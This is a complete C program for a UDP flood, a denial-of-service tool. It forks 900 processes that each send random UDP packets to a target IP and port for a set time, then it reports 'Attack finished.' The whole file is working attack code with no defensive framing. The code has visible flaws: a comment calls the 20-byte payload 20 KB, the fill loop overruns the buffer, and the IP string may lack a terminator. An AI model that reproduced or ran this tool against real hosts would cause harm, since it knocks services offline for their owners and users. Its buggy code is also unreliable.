#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#define PAYLOAD_SIZE 20     // 20 KB payload
#define CHILD_COUNT 900        // Default child processes count
#define RANDOM_STRING_SIZE 7   // Size of each random string

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Generate a random string of a fixed size
void generate_random_string(char *buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789/";
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size] = '\0'; // Null-terminate the string
}

// Function to send UDP packets efficiently
void send_udp_packets(AttackParams *params) {
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    char random_string[RANDOM_STRING_SIZE + 1]; // Buffer for the random string

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    // Set socket to non-blocking mode
    fcntl(sock, F_SETFL, O_NONBLOCK);

    // Increase socket buffer size
    int size = 1024 * 1024; // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &size, sizeof(size));

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    if (inet_pton(AF_INET, params->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        exit(1);
    }

    // Fill the payload with random strings
    for (size_t i = 0; i < PAYLOAD_SIZE; i += RANDOM_STRING_SIZE) {
        generate_random_string(random_string, RANDOM_STRING_SIZE);
        strncpy(payload + i, random_string, RANDOM_STRING_SIZE);
    }

    // Send the payload continuously during the specified duration
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Resource temporarily unavailable, retry
                usleep(100); // Sleep for 100 microseconds before retrying
            } else {
                perror("Send failed");
                break;
            }
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    // Parse command-line arguments
    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    // Seed the random number generator
    srand(time(NULL));

    // Create child processes to send packets
    for (int i = 0; i < CHILD_COUNT; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Child process sends UDP packets
            send_udp_packets(&params);
            exit(0); // Ensure child process terminates
        } else if (pid < 0) {
            perror("Fork failed");
            return 1;
        }
    }

    // Wait for all child processes to finish
    for (int i = 0; i < CHILD_COUNT; i++) {
        wait(NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
